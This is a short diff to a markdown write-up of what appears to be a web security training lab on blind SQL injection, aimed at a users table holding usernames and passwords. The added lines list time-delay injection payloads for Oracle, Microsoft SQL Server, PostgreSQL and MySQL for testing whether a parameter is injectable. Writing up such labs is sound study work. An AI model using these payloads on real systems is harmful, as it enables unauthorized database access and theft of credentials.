@@ -4,4 +4,10 @@
 # Goal
 - The database contains a different table called users, with columns called username and password
 # Solving The Lab
-- first thing is to check if the parameter is vulnurable
+- first thing is to check if the parameter is vulnurable we do that by checking with differnt db time delay function
+```
+' || (dbms_pipe.receive_message(('a'),10))--   Oracle
+' || (WAITFOR DELAY '0:0:10')--                microsoft
+' || (SELECT pg_sleep(10))--                   PostgreSQL
+' || (SELECT SLEEP(10))--                      MySQL
+```
